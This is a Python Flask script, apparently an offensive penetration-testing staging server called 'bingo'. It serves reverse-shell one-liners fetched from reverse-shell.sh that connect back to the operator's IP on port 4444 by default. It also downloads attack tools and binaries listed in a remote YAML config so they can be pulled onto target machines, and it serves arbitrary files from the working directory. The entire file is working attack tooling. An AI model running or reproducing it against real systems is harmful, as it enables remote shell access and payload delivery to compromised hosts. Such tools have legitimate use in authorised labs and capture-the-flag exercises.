#!/usr/bin/env python3
import requests, io, sys, yaml, os
from flask import Flask, send_file, request
from netifaces import interfaces, ifaddresses, AF_INET


net_interfaces = interfaces()

config_path = os.path.expanduser('~') + '/.config/bingo.yaml'
if not os.path.exists(config_path):
    url = 'https://raw.githubusercontent.com/LuskaBol/bingo/main/bingo.yaml'
    r = requests.get(url, allow_redirects=True)
    open(config_path, 'wb').write(r.content)
else:
    with open(config_path, 'r')  as stream:
        try:
            parsed = yaml.safe_load(stream)
        except yaml.YAMLError as exc:
            print(exc)

app = Flask(__name__)

def search(parse, key_value):
    return parse[next((i for i,key in enumerate(parse) if key_value in key), None)].get(key_value)

def get_rev_shell(ip,port):
    url = f'https://reverse-shell.sh/{ip}:{port}'
    return requests.get(url).text

def get_interface():
  return request.headers.get('Host').split(':')[0]

def get_raw_url_response(url):
    return requests.get(url).text

def download_binary_from_url(url, binary_name):
    return send_file(io.BytesIO(requests.get(url).content), 
                 mimetype='application/octet-stream', 
                 download_name = binary_name)

@app.route("/revshell", defaults={"port": "4444"})
@app.route('/revshell/<port>')
def reverse_shell(port):
    return get_rev_shell(get_interface(),port)

@app.route('/get/<program_name>')
def get_program(program_name):  
    try:
        if search(parsed.get('program').get(program_name), 'type') == 'binary':
            return download_binary_from_url(search(parsed.get('program').get(program_name), 'url'), program_name)
        return get_raw_url_response(search(parsed.get('program').get(program_name), 'url'))
    except TypeError:
        print(f'Program {program_name} not found!')
        return ''

@app.route('/', defaults={'req_path': ''})
@app.route('/<path:req_path>')
def dir_listing(req_path):
    BASE_DIR = os.path.abspath(os.getcwd())
    abs_path = os.path.join(BASE_DIR, req_path).replace('.', '')
    if os.path.isfile(abs_path):
        return send_file(abs_path)
    return ''

if __name__ == '__main__':
    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *x: None
    try:
      interface = next(filter(lambda x: x in net_interfaces, ['tun0', 'eth0']))
      print(f'Your ip is: {ifaddresses(interface)[2][0]["addr"]}')
    except StopIteration:
      print('We couldn\'t find your net interface :(')
    if len(sys.argv) > 1 and int(sys.argv[1]) < 65535 and int(sys.argv[1]) >= 1:
      try:
        app.run(host='0.0.0.0', port=sys.argv[1])
      except ValueError:
        print('You can only use numbers as ports.')
    else:
      app.run(host='0.0.0.0', port=8000)
